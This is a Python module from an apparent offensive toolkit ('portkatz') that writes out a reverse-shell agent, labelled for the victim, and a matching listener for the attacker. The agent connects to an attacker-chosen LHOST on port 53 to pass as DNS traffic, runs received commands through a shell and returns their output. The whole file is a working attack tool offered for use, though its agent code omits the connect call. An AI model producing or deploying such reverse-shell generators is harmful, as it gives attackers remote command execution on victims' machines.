class Module:

    def __init__(self):
        self.parameters = {'FORMAT': 'P'}

    def params(self):
        return '''
Name:       Description:
--------    ---------------
LHOST       The IP to get commands from.
FORMAT      The format to build the scripts in. (P = Python, J = Java)
'''
    def set(self, param, value):
        self.parameters[param] = value

    def run(self):
        err = None
        if self.parameters['FORMAT'] == 'P':
            if not self.parameters.get('LHOST'):
                err = '[-] LHOST not set.'
                return err
            LHOST = self.parameters['LHOST']
            baseagent = '''
import socket
import subprocess


address = (\'<LHOST>\', 53)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def connect():
    while True: 
        command =  s.recv(1024)
        
        if 'terminate' in command:
            s.close()
            break 
        
        else:
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read()  ) 
            s.send( CMD.stderr.read()  ) 

if __name__ == '__main__':
    connect()
            '''
            agent = baseagent.replace('<LHOST>', LHOST)

            baseserver = '''
import socket

address = (\'<LHOST>\', 53)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def connect():
    s.bind(address)
    s.listen(1)
    print('[+] Listener Active on Port 53 (DNS)')
    conn, addr = s.accept()
    print('[+] Connection from: ', addr)
    while True:
        command = input('portkatz(dns_rs) > ')
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            quit()
        else:
            conn.send(command.encode())

if __name__ == '__main__':
    connect()
            '''

            server = baseserver.replace('<LHOST>', LHOST)

            print('[+] Generated Agent and Server Scripts.')
            print('[+] Writing to file...')
            with open('dns_rs_agent.portkatz.py', 'w') as o:
                o.write(agent)
            print('[+] Wrote Agent to \'dns_rs_agent.portkatz.py\' (For Victim)')
            with open('dns_rs_server.portkatz.py', 'w') as o:
                o.write(server)
            print('[+] Wrote Server to \'dns_rs_server.portkatz.py\' (For Attacker (YOU))')
            
        else:
            err = '[-] ' + self.parameters['FORMAT'] + 'is an invalid format.'
            return err



        return err
